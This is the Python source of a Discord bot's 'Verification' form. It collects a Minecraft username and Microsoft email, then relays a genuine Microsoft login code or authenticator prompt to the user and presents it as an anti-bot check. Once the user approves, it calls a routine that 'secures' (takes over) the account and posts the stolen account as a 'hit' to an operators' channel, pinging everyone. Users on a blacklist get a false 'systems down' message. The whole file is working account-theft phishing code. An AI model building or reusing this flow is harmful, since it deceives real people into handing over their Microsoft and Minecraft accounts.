from database.database import DBConnection
from urllib.parse import quote
from discord import ui, Embed
import discord
import asyncio
import json
import re

from ui.buttons.submit_code import ButtonViewTwo
from ui.buttons.missing_email import ButtonViewThree
from ui.buttons.embed_buttons import ButtonOptions
from ui.buttons.account_details import accountInfo

from securing.auth.check_auth import check_authenticator
from securing.auth.initial_session import get_session
from securing.secure import startSecuringAccount
from shared.send_logs import send_logs, build_log_embed
from securing.auth.send_auth import send_auth

class MyModalOne(ui.Modal):
    def __init__(self):
        super().__init__(title="Verification")
        self.add_item(ui.InputText(label="Minecraft Username", required = True))
        self.add_item(ui.InputText(label="Minecraft Email", required = True))

    async def callback(self, interaction: discord.Interaction) -> None:
        username = quote(self.children[0].value)
        email = self.children[1].value
        config = json.load(open("config/config.json", "r"))

        hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])

        # Blacklisted Users
        with DBConnection() as database:
            if interaction.user.id in database.get_blacklisted_users():
                await interaction.response.send_message(
                    embed = Embed(
                        title = "Could not verify",
                        description = "Our systems seem to be down at the moment. Please try again in a few hours.",
                        color = 0xFA4343
                    ),
                    ephemeral = True
                )

                await send_logs(
                    interaction.client,
                    build_log_embed(
                        f"**Email | Status | Reason**\n```{email} | Refused to Verify | User has been blacklisted```",
                        0xFA4343,
                        thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                        user=interaction.user,
                        bot=interaction.client,
                    ),
                    view=ButtonOptions(interaction.user, interaction.user.id, username),
                    email=email,
                )
                return

        # Check if email is valid
        if not re.compile(r"^[\w\.-]+@([\w-]+\.)+[\w-]{2,4}$").match(email):
            await interaction.response.send_message(
                embed = Embed(
                    title = "Invalid Email Address",
                    description="Make sure you entered your email correctly!",
                    color = 0xFA4343
                ),
                ephemeral = True
            )

            await send_logs(
                interaction.client,
                build_log_embed(
                    f"**Email | Status | Reason**\n```{email} | Failed to Verify | Invalid email entered```",
                    0xFA4343,
                    thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                    user=interaction.user,
                    bot=interaction.client,
                ),
                view=ButtonOptions(interaction.user, interaction.user.id, username),
                email=email,
            )
            return

        await interaction.response.defer(ephemeral=True)

        self.session = get_session()

        # Sends OTP/Auth code
        emailInfo = await send_auth(self.session, email)

        # Email does not exist (ifExistsResults == 1 can be used as an alternative)
        if "type" not in emailInfo:
            await send_logs(
                interaction.client,
                build_log_embed(
                    f"**Email | Status | Reason**\n```{email} | Failed to send code | Email does not exist```",
                    0xFA4343,
                    thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                    user=interaction.user,
                    bot=interaction.client,
                ),
                view=ButtonOptions(interaction.user, interaction.user.id, username),
                email=email,
            )

            await interaction.followup.send(
                embed = Embed(
                    title = "Failed to verify",
                    description = "The email you entered does not exist, make sure you entered it correctly!",
                    color = 0xFA4343
                ),
                ephemeral = True
            )
            return

        # Entropy = Authenticator App number to click in
        elif emailInfo["type"] == "authenticator":
            print("\n| Starting securing process |\n")
            print("[+] - Found Authenticator App")

            device = emailInfo["response"]["Credentials"]["RemoteNgcParams"]["SessionIdentifier"]
            entropy = emailInfo["response"]["Credentials"]["RemoteNgcParams"]["Entropy"]

            await interaction.followup.send(
                embed = Embed(
                    title="Last Step",
                    description=f"An Authenticator Request has been sent.\nPlease confirm the code **`{entropy}`** on your app!\nThis step prevents automated or fake verifications.",
                    colour=0x00FF00
                ),
                ephemeral = True
            )

            await send_logs(
                interaction.client,
                build_log_embed(
                    f"**Username | Email | Status**\n```{username} | {email} | Waiting for Auth confirmation```",
                    0x3B89FF,
                    thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                    user=interaction.user,
                    bot=interaction.client,
                ),
                view=ButtonOptions(interaction.user, interaction.user.id, username),
                email=email,
            )

            i = 0
            while i < 60:

                data = await check_authenticator(device)
                if data["SessionState"] > 1 and data["AuthorizationState"] == 1:

                    await interaction.followup.send(
                        embed = Embed(
                            title = "Failed to verify",
                            description = "You pressed the wrong number on your authenticator app. Try again!",
                            colour=0xFA4343
                        ),
                        ephemeral = True
                    )

                    await send_logs(
                        interaction.client,
                        build_log_embed(
                            f"**Email | Status | Reason**\n```{email} | Failed to verify | Clicked on the wrong auth number```",
                            0xFA4343,
                            thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                            user=interaction.user,
                            bot=interaction.client,
                        ),
                        view=ButtonOptions(interaction.user, interaction.user.id, username),
                        email=email,
                    )
                    return

                elif data["SessionState"] > 1 and data["AuthorizationState"] > 1:

                    await send_logs(
                        interaction.client,
                        content="**This account is being automaticly secured**"
                    )
                    await send_logs(
                        interaction.client,
                        build_log_embed(
                            f"**Username | Email | Status**\n```{username} | {email} | Auth code confirmed!```",
                            0x79D990,
                            thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                            user=interaction.user,
                            bot=interaction.client,
                        ),
                        view=ButtonOptions(interaction.user, interaction.user.id, username),
                        email=email,
                    )

                    await interaction.followup.send(
                        embed = discord.Embed(
                            title = "Processing...",
                            description = "⌛ Please allow us to proccess your roles",
                            color = 0xDE755B
                        ),
                        ephemeral = True
                    )

                    # Embeds | Account, Minecraft, SSID, Extra Info, Inbox (separate)
                    securedAccount = await startSecuringAccount(self.session, email, device)

                    if not securedAccount:
                        await send_logs(
                            interaction.client,
                            build_log_embed(
                                f"**Email | Status | Reason**\n```{email} | Failed to secure | Invalid Code Entered```",
                                0xFA4343,
                                thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                                user=interaction.user,
                                bot=interaction.client,
                            ),
                            view=ButtonOptions(interaction.user, interaction.user.id, username),
                            email=email,
                        )
                        return

                    mc_name = securedAccount['minecraft']['name']
                    secured_desc = f"**{mc_name}** has been successfully secured."
                    if mc_name == "No Minecraft":
                        secured_desc = "An account has been secured but it does not own Minecraft."

                    await send_logs(
                        interaction.client,
                        Embed(
                            title="New Account Secured",
                            description=secured_desc,
                            color=0xFF9E45 if mc_name != "No Minecraft" else 0x3B89FF
                        ).set_thumbnail(url=f"https://mc-heads.net/avatar/{quote(mc_name)}/128"),
                        email=email,
                        censored_only=True,
                    )

                    await hits_channel.send("@everyone **Successfully secured an account**")
                    await hits_channel.send(embed = securedAccount["details"]["stats_embed"])
                    await hits_channel.send(
                        embed = securedAccount["hit_embed"],
                        view = accountInfo(
                            securedAccount["details"]
                        )
                    )

                    return

                await asyncio.sleep(1)
                i += 1

        elif emailInfo["type"] == "email":

            flowtoken = emailInfo["response"]["Credentials"]["OtcLoginEligibleProofs"][0]["data"]
            ppft = emailInfo["ppft"]

            print(emailInfo["response"]["Credentials"]["OtcLoginEligibleProofs"])
            print(f"Flowtoken: {flowtoken}")
            print(f"")
            print("\n| Starting securing process |\n")
            print(f"[+] - Found security email!")

            await interaction.followup.send(
                embed=Embed(
                    title="Last Step",
                    description="To complete verification, enter the confirmation code we sent to your security email! This step prevents automated or fake verifications.",
                    colour=0x00FF00
                ),
                view = ButtonViewTwo(
                    username = username,
                    email = email,
                    flowtoken = flowtoken,
                    ppft = ppft
                ),
                ephemeral = True
            )

            await send_logs(
                interaction.client,
                build_log_embed(
                    f"**Username | Email | Status**\n```{username} | {email} | Waiting for OTP code```",
                    0x3B89FF,
                    thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                    user=interaction.user,
                    bot=interaction.client
                ),
                email=email,
                view=ButtonOptions(interaction.user, interaction.user.id, username)
            )

            return

        await send_logs(
            interaction.client,
            build_log_embed(
                f"**Email | Status | Reason**\n```{email} | Failed to send code | No OTP methods found```",
                0xFA4343,
                thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
                user=interaction.user,
                bot=interaction.client
            ),
            email=email,
            view=ButtonOptions(interaction.user, interaction.user.id, username)
        )

        await interaction.followup.send(
            embed = Embed(
                title = "Security Email Required",
                description = "We couldn't detect a recovery/security email for this account. Add a recovery email in your Microsoft account and try verifying again."
            ),
            view=ButtonViewThree(),
            ephemeral = True
        )

        return
